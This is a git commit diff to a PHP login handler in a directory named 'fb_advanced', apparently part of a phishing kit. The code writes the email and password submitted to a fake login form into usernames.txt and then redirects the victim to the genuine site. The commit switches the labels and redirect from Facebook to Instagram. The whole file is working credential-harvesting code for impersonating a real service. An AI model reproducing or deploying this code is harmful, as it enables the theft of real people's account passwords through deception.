f2c30dd76fdacc4b74b3b2351442c9631e133651
Aryan Shrestha <67673221+Aryanstha@users.noreply.github.com>
2022-03-23 21:20:53 +0545

    Update login.php

--- .sites/fb_advanced/login.php
+++ .sites/fb_advanced/login.php
@@ -1,6 +1,5 @@
 <?php
-
-file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://www.facebook.com/');
+file_put_contents("usernames.txt", "Instagram Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+header('Location: https://instagram.com/');
 exit();
 ?>
